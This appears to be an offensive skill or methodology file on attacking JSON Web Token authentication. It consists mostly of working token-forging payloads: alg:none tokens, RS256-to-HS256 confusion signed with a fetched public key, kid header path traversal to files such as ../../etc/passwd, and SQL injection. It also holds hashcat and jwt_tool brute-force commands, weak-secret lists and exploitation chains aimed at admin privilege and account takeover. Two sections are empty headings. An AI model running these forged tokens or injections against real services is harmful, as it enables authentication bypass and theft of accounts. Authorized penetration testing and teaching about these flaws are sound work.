---
name: jwt-attacks
description: Complete JWT attack methodology — alg:none, algorithm confusion (RS256→HS256), JWKS poisoning, kid injection, secret brute-force, CVE matching. Detection, exploitation chains, payloads, tool commands.
category: authn-authz
---

# JWT Attack Methodology — THE COMPLETE GUIDE

## Decision Tree
```
1. JWT observed in traffic (Authorization: Bearer, cookie, response body)?
   ├── Decode header + payload (base64url)
   ├── Check alg field → None/RS256/HS256/ES256
   ├── Check for kid, jku, x5u, x5c headers
   └── Check claims: exp, aud, iss, sub, role, username

2. alg = none / None / NONE / mixed-case?
   ├── Try alg:none bypass (empty signature)
   └── Try alg:None with various capitalizations

3. alg = HS256 (symmetric)?
   ├── Brute-force secret (hashcat -m 16500)
   ├── Try default/weak secrets (secret, key, password, your-2fa)
   └── Try leaked secrets from source/JS/config

4. alg = RS256 (asymmetric)?
   ├── Check for JWKS endpoint (/.well-known/jwks.json)
   ├── Try RS256→HS256 confusion (sign with public key as HMAC secret)
   ├── Check jku header → JWKS poisoning
   ├── Check kid header → path traversal / SQLi / command injection
   └── Try cross-service/cross-tenant token replay

5. CVE check (python-jose, Spring Security, golang-jwt, fast-jwt)?
   ├── CVE-2025-4692 (python-jose ≤3.3.0 alg confusion)
   ├── CVE-2025-30144 (Spring Security JKU injection/SSRF)
   ├── CVE-2025-27371 (golang-jwt v4 alg confusion)
   └── CVE-2026-34950 (fast-jwt whitespace RSA key confusion)
```

## 1. JWT Detection

### Quick Detection (Windows)
```powershell
# Manual decode (base64url) - PowerShell
function Decode-JwtPart($part) {
    $part = $part -replace '_','/' -replace '-','+'
    switch ($part.Length % 4) {
        1 { $part += "===" }
        2 { $part += "==" }
        3 { $part += "=" }
    }
    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($part))
}

$TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
$parts = $TOKEN -split '\.'
Decode-JwtPart $parts[0]  # Header
Decode-JwtPart $parts[1]  # Payload

# Check for JWT in responses
Select-String -Pattern "eyJ" -Path "*.js","*.html","*.json" -Recurse
```

### What to Check
| Field | Check |
|-------|-------|
| `alg` | none, None, NONE, HS256, RS256, ES256, PS256, EdDSA |
| `typ` | JWT (should be present) |
| `kid` | Key ID — injection point for path traversal/SQLi |
| `jku` | JWK Set URL — points to attacker-controlled JWKS |
| `x5u` | X.509 URL — similar to jku |
| `x5c` | X.509 certificate chain |
| `exp` | Expiration — try expired tokens (clock skew) |
| `nbf` | Not Before — try tokens not yet valid |
| `iat` | Issued At |
| `iss` | Issuer — cross-service replay |
| `aud` | Audience — cross-tenant replay |
| `sub` | Subject |
| `role` / `admin` / `username` / `email` | Privilege claims to manipulate |

## 2. Algorithm Confusion: alg:none

### When to Try
- alg field in header is `none`, `None`, `NONE`, `nOnE`, `noNe`
- Server reads alg from header without pinning

### Payloads (Windows)
```powershell
# Generate with Python if available
python -c "
import base64, json
HEADER='{\"alg\":\"none\",\"typ\":\"JWT\"}'
PAYLOAD='{\"sub\":\"admin\",\"role\":\"admin\"}'
HEADER_B64=base64.urlsafe_b64encode(HEADER.encode()).decode().rstrip('=')
PAYLOAD_B64=base64.urlsafe_b64encode(PAYLOAD.encode()).decode().rstrip('=')
print(f'{HEADER_B64}.{PAYLOAD_B64}.')
"
# Variations to try: alg: None, NONE, nOnE, noNe, NONE, null
# Some servers accept alg: "none" with a signature of "x" or "AA=="
```

## 3. Algorithm Confusion: RS256→HS256

### When to Try
- alg = RS256 (asymmetric — server has public key)
- Server reads alg from header, uses public key as HMAC secret
- Server does not pin algorithm

### Exploitation (Windows)
```powershell
# Step 1: Get the public key
# From JWKS endpoint
curl.exe -s https://target.com/.well-known/jwks.json
curl.exe -s https://target.com/oauth/.well-known/jwks.json
curl.exe -s https://target.com/.well-known/openid-configuration

# Step 2: Sign with public key as HMAC secret (requires Python/jwt library)
python -c "
import jwt, time
with open('public_key.pem', 'r') as f:
    public_key = f.read()
payload = {'sub': 'admin', 'role': 'admin', 'exp': int(time.time()) + 3600}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
"
```

## 4. JWKS Poisoning (jku injection)

### When to Try
- `jku` header present in JWT
- Server fetches JWKS from jku URL to verify signature

## 5. kid (Key ID) Injection

### Path Traversal
```powershell
python -c "
import jwt
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    'secret',
    algorithm='HS256',
    headers={'kid': '../../../../dev/null'}
)
print(token)
"
# Common paths: ../../dev/null, /dev/null, ../../../../dev/null, ../../etc/passwd
```

### SQL Injection in kid
```powershell
python -c "
import jwt
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    'secret',
    algorithm='HS256',
    headers={'kid': \"' UNION SELECT 'secret'--\"}
)
print(token)
"
```

## 6. HMAC Secret Brute-Force

### Hashcat (Windows)
```powershell
# Format: token:secret (hashcat mode 16500)
echo "$TOKEN" > jwt.txt
# Crack with rockyou
hashcat.exe -m 16500 jwt.txt rockyou.txt
# Common secrets: secret, key, password, your-2fa, secretkey, jwt_secret, admin, changeme, test, dev, production
```

## 7. Cross-Service / Cross-Tenant Replay

## 8. CVE Checks

- CVE-2025-4692 (python-jose ≤3.3.0) — alg confusion
- CVE-2025-30144 (Spring Security JOSE) — JKU injection/SSRF
- CVE-2025-27371 (golang-jwt v4) — alg confusion
- CVE-2026-34950 (fast-jwt) — whitespace RSA key confusion

## 9. Exploitation Chains

Chain 1: alg:none → Privilege Escalation
Chain 2: Secret Brute-Force → Data Access
Chain 3: JWKS Poisoning → Full ATO
Chain 4: kid Path Traversal → Secret Disclosure
Chain 5: RS256→HS256 → Privilege Escalation

## 10. Tool Commands

### jwt_tool (if Python available)
```bash
python jwt_tool.py <token> -M at          # All tests
python jwt_tool.py <token> -X n           # alg:none bypass
python jwt_tool.py <token> -X a -k pub.pem # Algorithm confusion
python jwt_tool.py <token> -b -d rockyou.txt # Brute force
```

### Burp JWT Editor
1. Intercept JWT in Proxy
2. JWT Editor tab → "Attack" dropdown
3. Select: None Algorithm, Algorithm Confusion, etc.
4. Modify payload claims
5. Send to Repeater

### Python (Windows)
```powershell
# Forge HS256
python -c "
import jwt
token = jwt.encode({'sub': 'admin', 'role': 'admin'}, 'secret', algorithm='HS256')
print(token)
"

# Forge RS256 with public key (algorithm confusion)
python -c "
import jwt
pub = open('pub.pem').read()
token = jwt.encode({'sub': 'admin'}, pub, algorithm='HS256')
print(token)
"

# Decode
python -c "
import jwt
token = 'eyJ...'
print(jwt.decode(token, options={'verify_signature': False}))
"
```